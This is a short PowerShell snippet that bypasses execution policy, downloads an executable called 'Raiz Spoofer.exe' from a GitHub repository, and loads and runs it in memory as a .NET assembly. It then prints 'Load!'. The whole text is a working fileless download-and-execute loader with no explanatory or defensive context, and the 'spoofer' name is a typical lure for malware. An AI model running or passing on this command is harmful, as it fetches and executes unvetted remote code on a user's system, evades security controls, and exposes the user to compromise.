powershell -ep bypass -c "$data = (New-Object Net.WebClient).DownloadData('https://github.com/tyu0720gyi/service/blob/main/Raiz%20Spoofer.exe'); [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)"

Write-Host "Load!" -ForegroundColor Cyan
